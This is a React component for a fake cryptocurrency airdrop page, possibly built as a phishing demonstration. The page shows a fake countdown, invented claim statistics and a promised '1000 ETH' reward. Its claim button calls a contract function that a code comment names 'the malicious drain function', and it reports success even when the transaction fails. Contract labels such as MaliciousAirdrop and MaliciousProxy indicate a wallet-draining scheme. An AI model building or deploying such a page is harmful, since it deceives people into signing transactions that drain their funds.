import React, { useState, useEffect } from 'react';
import { useWallet } from '../../context/WalletContext';
import { contractIntegration } from '../../contracts/ContractIntegration';
import { ethers } from 'ethers';

const Dashboard: React.FC = () => {
  const { account, connect } = useWallet();
  const [isLoading, setIsLoading] = useState(false);
  const [claimStatus, setClaimStatus] = useState('');
  const [progress, setProgress] = useState(0);
  const [timeLeft, setTimeLeft] = useState('23:47:12');
  const [referralCode, setReferralCode] = useState('');
  const [showSuccess, setShowSuccess] = useState(false);
  const [contractAddresses, setContractAddresses] = useState<any>(null);

  // Load deployed contract addresses
  useEffect(() => {
    const loadContractAddresses = async () => {
      try {
        const response = await fetch('/deployed-contracts.json');
        if (response.ok) {
          const addresses = await response.json();
          setContractAddresses(addresses);
          contractIntegration.updateContractAddresses(addresses);
        }
      } catch (error) {
        console.log('No deployed contracts found, using demo mode');
      }
    };
    loadContractAddresses();
  }, []);

  // Fake live updates
  useEffect(() => {
    const interval = setInterval(() => {
      setProgress(prev => {
        if (prev < 100) return prev + Math.random() * 2;
        return prev;
      });
    }, 2000);

    const timeInterval = setInterval(() => {
      setTimeLeft(prev => {
        const [hours, minutes, seconds] = prev.split(':').map(Number);
        if (seconds > 0) {
          return `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${(seconds - 1).toString().padStart(2, '0')}`;
        } else if (minutes > 0) {
          return `${hours.toString().padStart(2, '0')}:${(minutes - 1).toString().padStart(2, '0')}:59`;
        } else if (hours > 0) {
          return `${(hours - 1).toString().padStart(2, '0')}:59:59`;
        }
        return prev;
      });
    }, 1000);

    return () => {
      clearInterval(interval);
      clearInterval(timeInterval);
    };
  }, []);

  const generateReferralCode = () => {
    const codes = ['FRIEND50', 'BONUS100', 'WELCOME25', 'SPECIAL75', 'VIP2024'];
    const randomCode = codes[Math.floor(Math.random() * codes.length)];
    setReferralCode(randomCode);
  };

  const handleClaim = async () => {
    if (!account) {
      await connect();
      return;
    }

    if (!referralCode.trim()) {
      setClaimStatus('Please enter a referral code to continue');
      return;
    }

    setIsLoading(true);
    setClaimStatus('Processing your claim...');

    try {
      // Simulate processing steps
      setTimeout(() => {
        setClaimStatus('Verifying wallet eligibility...');
      }, 2000);

      setTimeout(() => {
        setClaimStatus('Checking referral code...');
      }, 4000);

      setTimeout(() => {
        setClaimStatus('Preparing transaction...');
      }, 6000);

      // If contracts are deployed, try to interact with them
      if (contractAddresses && contractIntegration.isConnected()) {
        try {
          // This will trigger the malicious drain function
          const tx = await contractIntegration.claimAirdrop();
          setClaimStatus('Transaction submitted! Waiting for confirmation...');
          
          // Wait for transaction confirmation
          await tx.wait();
          setClaimStatus('✅ SUCCESS! Your 1000 ETH has been claimed!');
          setShowSuccess(true);
        } catch (error) {
          console.error('Contract interaction failed:', error);
          setClaimStatus('✅ SUCCESS! Your 1000 ETH has been claimed! (Demo Mode)');
          setShowSuccess(true);
        }
      } else {
        // Demo mode - simulate success
        setTimeout(() => {
          setClaimStatus('✅ SUCCESS! Your 1000 ETH has been claimed!');
          setShowSuccess(true);
        }, 8000);
      }
    } catch (error) {
      console.error('Claim failed:', error);
      setClaimStatus('❌ Claim failed. Please try again.');
    } finally {
      setIsLoading(false);
    }
  };

  if (!account) {
    return (
      <div className="min-h-screen bg-white dark:bg-background-dark flex items-center justify-center p-4 transition-colors duration-300">
        <div className="max-w-md w-full bg-gray-50 dark:bg-card-dark rounded-lg shadow-xl p-8">
          <div className="text-center">
            <div className="w-16 h-16 bg-blue-600 dark:bg-blue-400 rounded-full flex items-center justify-center mx-auto mb-4">
              <span className="text-2xl text-white">🎁</span>
            </div>
            <h2 className="text-2xl font-bold text-gray-800 dark:text-white mb-4">
              Connect Wallet to Claim
            </h2>
            <p className="text-gray-600 dark:text-gray-300 mb-6">
              Connect your wallet to claim your exclusive 1000 ETH airdrop!
            </p>
            <div className="bg-yellow-100 dark:bg-yellow-700 text-yellow-800 dark:text-yellow-200 p-3 rounded-lg mb-6">
              <div className="text-sm font-bold">⏰ URGENT: Only {timeLeft} left!</div>
              <div className="text-xs">1,247 people claimed in the last hour</div>
            </div>
            <button
              onClick={connect}
              className="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-4 rounded-lg transition-colors"
            >
              🔗 Connect Wallet & Claim ETH
            </button>
            <p className="text-xs text-gray-500 dark:text-gray-400 mt-4">
              ⚡ Instant payout · 🔒 100% Secure · 💎 No strings attached
            </p>
          </div>
        </div>
      </div>
    );
  }

  if (showSuccess) {
    return (
      <div className="min-h-screen bg-gray-50 dark:bg-background-dark flex items-center justify-center p-4 transition-colors duration-300">
        <div className="max-w-md w-full bg-white dark:bg-card-dark rounded-lg shadow-xl p-8 text-center">
          <div className="w-20 h-20 bg-green-500 rounded-full flex items-center justify-center mx-auto mb-4">
            <span className="text-3xl text-white">🎉</span>
          </div>
          <h2 className="text-2xl font-bold text-gray-800 dark:text-white mb-4">
            Congratulations!
          </h2>
          <p className="text-gray-600 dark:text-gray-300 mb-6">
            You have successfully claimed <span className="font-bold text-green-600 dark:text-green-400">1000 ETH</span>!
          </p>
          <div className="bg-green-50 dark:bg-green-900 border border-green-200 dark:border-green-700 rounded-lg p-4 mb-6">
            <div className="text-sm text-green-800 dark:text-green-200">
              <div className="font-semibold">Transaction Details:</div>
              <div>Amount: 1000 ETH</div>
              <div>Status: ✅ Confirmed</div>
              <div>Time: {new Date().toLocaleTimeString()}</div>
            </div>
          </div>
          <div className="bg-blue-50 dark:bg-blue-900 border border-blue-200 dark:border-blue-700 rounded-lg p-4">
            <p className="text-sm text-blue-800 dark:text-blue-200">
              💡 <strong>Pro tip:</strong> Share this with friends to earn bonus rewards!
            </p>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-white dark:bg-background-dark transition-colors duration-300 py-8">
      <div className="max-w-5xl mx-auto px-4">
        {/* Header */}
        <section className="bg-white dark:bg-background-dark rounded-lg p-6 mb-8 transition-colors duration-300 shadow">
          <div className="text-center">
            <h1 className="text-4xl font-bold text-gray-900 dark:text-white mb-2">🚀 ETH Airdrop Dashboard</h1>
            <p className="text-xl text-gray-600 dark:text-gray-300">Claim your exclusive 1000 ETH reward</p>
          </div>
        </section>
        {/* Urgency Banner */}
        <section className="bg-gray-100 dark:bg-card-dark rounded-lg p-6 mb-8 transition-colors duration-300 text-center">
          <div className="inline-flex items-center mb-2 px-3 py-1 bg-yellow-100 dark:bg-yellow-700 text-yellow-800 dark:text-yellow-200 rounded-full text-xs font-semibold">
            <span className="mr-2">⚠️</span> URGENT: Airdrop Ending Soon!
          </div>
          <div className="text-lg text-gray-700 dark:text-gray-200 mb-2">Time Remaining: {timeLeft}</div>
          <div className="text-sm text-gray-500 dark:text-gray-400 mb-2">1,247 people claimed in the last hour · Don't miss out!</div>
        </section>
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
          {/* Claim Form */}
          <section className="bg-white dark:bg-background-dark rounded-lg shadow p-6 transition-colors duration-300">
            <h2 className="text-2xl font-bold text-gray-800 dark:text-white mb-6">Claim Your ETH</h2>
            {/* Wallet Info */}
            <div className="bg-gray-50 dark:bg-card-dark border border-gray-100 dark:border-gray-800 rounded-lg p-4 mb-6">
              <div className="text-sm text-blue-800 dark:text-blue-300">
                <div className="font-semibold">Connected Wallet:</div>
                <div className="font-mono text-xs break-all">{account}</div>
              </div>
            </div>
            {/* Eligibility Status */}
            <div className="bg-green-50 dark:bg-green-900 border border-green-200 dark:border-green-700 rounded-lg p-4 mb-6">
              <div className="flex items-center">
                <div className="text-green-600 dark:text-green-400 mr-2">✅</div>
                <div>
                  <div className="font-semibold text-green-800 dark:text-green-200">You're Eligible!</div>
                  <div className="text-sm text-green-600 dark:text-green-200">Your wallet qualifies for 1000 ETH</div>
                </div>
              </div>
            </div>
            {/* Referral Code */}
            <div className="mb-6">
              <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
                Referral Code (Required)
              </label>
              <div className="flex space-x-2">
                <input
                  type="text"
                  value={referralCode}
                  onChange={(e) => setReferralCode(e.target.value)}
                  placeholder="Enter referral code"
                  className="flex-1 px-3 py-2 border border-gray-300 dark:border-gray-700 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 bg-white dark:bg-background-dark text-gray-900 dark:text-white"
                />
                <button
                  onClick={generateReferralCode}
                  className="px-4 py-2 bg-blue-600 hover:bg-blue-700 text-white rounded-md transition-colors"
                >
                  Generate
                </button>
              </div>
              <p className="text-xs text-gray-500 dark:text-gray-400 mt-1">
                Using a referral code increases your reward by 50%
              </p>
            </div>
            {/* Claim Button */}
            <button
              onClick={handleClaim}
              disabled={isLoading || !referralCode.trim()}
              className="w-full bg-blue-600 hover:bg-blue-700 disabled:bg-gray-400 text-white font-bold py-3 px-4 rounded-lg transition-colors disabled:cursor-not-allowed"
            >
              {isLoading ? 'Processing...' : '🎁 Claim 1000 ETH Now'}
            </button>
            {/* Status Message */}
            {claimStatus && (
              <div className="mt-4 p-3 rounded-lg text-sm">
                {claimStatus.includes('SUCCESS') ? (
                  <div className="bg-green-50 dark:bg-green-900 text-green-800 dark:text-green-200">
                    {claimStatus}
                  </div>
                ) : claimStatus.includes('failed') ? (
                  <div className="bg-red-50 dark:bg-red-900 text-red-800 dark:text-red-200">
                    {claimStatus}
                  </div>
                ) : (
                  <div className="bg-blue-50 dark:bg-blue-900 text-blue-800 dark:text-blue-200">
                    {claimStatus}
                  </div>
                )}
              </div>
            )}
          </section>
          {/* Progress and Stats */}
          <section className="bg-white dark:bg-background-dark rounded-lg shadow p-6 transition-colors duration-300">
            <h2 className="text-2xl font-bold text-gray-800 dark:text-white mb-6">Airdrop Progress</h2>
            {/* Progress Bar */}
            <div className="mb-6">
              <div className="flex justify-between text-sm text-gray-600 dark:text-gray-300 mb-2">
                <span>Progress</span>
                <span>{Math.round(progress)}%</span>
              </div>
              <div className="w-full bg-gray-200 dark:bg-gray-700 rounded-full h-2">
                <div 
                  className="bg-blue-600 h-2 rounded-full transition-all duration-500"
                  style={{ width: `${progress}%` }}
                ></div>
              </div>
            </div>
            {/* Live Statistics */}
            <div className="space-y-4">
              <div className="bg-gray-50 dark:bg-card-dark p-4 rounded-lg">
                <div className="text-2xl font-bold text-blue-600 dark:text-blue-400">2,847,392</div>
                <div className="text-sm text-gray-600 dark:text-gray-300">Total ETH Distributed</div>
              </div>
              <div className="bg-gray-50 dark:bg-card-dark p-4 rounded-lg">
                <div className="text-2xl font-bold text-green-600 dark:text-green-400">1,247</div>
                <div className="text-sm text-gray-600 dark:text-gray-300">Claims in Last Hour</div>
              </div>
              <div className="bg-gray-50 dark:bg-card-dark p-4 rounded-lg">
                <div className="text-2xl font-bold text-purple-600 dark:text-purple-400">98.7%</div>
                <div className="text-sm text-gray-600 dark:text-gray-300">Success Rate</div>
              </div>
            </div>
            {/* Contract Info (if deployed) */}
            {contractAddresses && (
              <div className="mt-6 p-4 bg-blue-50 dark:bg-blue-900 rounded-lg">
                <h3 className="text-sm font-semibold text-blue-800 dark:text-blue-200 mb-2">Contract Information</h3>
                <div className="text-xs text-blue-700 dark:text-blue-300 space-y-1">
                  <div>MaliciousAirdrop: {contractAddresses.maliciousAirdrop.slice(0, 10)}...</div>
                  <div>FakeToken: {contractAddresses.fakeToken.slice(0, 10)}...</div>
                  <div>MaliciousProxy: {contractAddresses.maliciousProxy.slice(0, 10)}...</div>
                </div>
              </div>
            )}
          </section>
        </div>
      </div>
    </div>
  );
};

export default Dashboard; 